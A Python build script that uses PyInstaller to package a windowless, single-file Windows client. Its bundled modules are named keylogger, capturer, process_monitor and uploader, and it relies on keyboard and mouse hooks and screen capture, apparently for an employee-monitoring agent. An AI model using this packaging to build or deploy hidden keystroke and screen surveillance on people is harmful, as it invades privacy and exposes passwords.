import subprocess
import sys
from datetime import datetime


def build():
    date_str = datetime.now().strftime("%Y%m%d")
    name = f"tam_user_{date_str}"

    hidden_imports = [
        "pynput.keyboard._win32",
        "pynput.mouse._win32",
        "PIL._tkinter_finder",
        "pystray",
        "pystray._win32",
        "mss",
        "mss.windows",
        "psutil",
        "requests",
        "requests.adapters",
        "urllib3",
        "cryptography",
        "cryptography.fernet",
        "zoneinfo",
        "sqlite3",
        "tkinter",
        "tkinter.ttk",
        "tkinter.messagebox",
        "PIL",
        "PIL.Image",
        "PIL.ImageDraw",
        "buffer",
        "capturer",
        "config",
        "connection",
        "identity",
        "keylogger",
        "process_monitor",
        "tray",
        "uploader",
        "service",
    ]

    client_modules = [
        "client/buffer.py",
        "client/capturer.py",
        "client/config.py",
        "client/connection.py",
        "client/identity.py",
        "client/keylogger.py",
        "client/process_monitor.py",
        "client/tray.py",
        "client/uploader.py",
        "client/service.py",
    ]

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        f"--name={name}",
    ]

    for mod in client_modules:
        cmd.extend(["--add-data", f"{mod};."])

    for imp in hidden_imports:
        cmd.extend(["--hidden-import", imp])

    cmd.append("client/main.py")

    print(f"Building {name}.exe ...")
    subprocess.run(cmd, check=True)
    print(f"Done! Output: dist/{name}.exe")


if __name__ == "__main__":
    build()
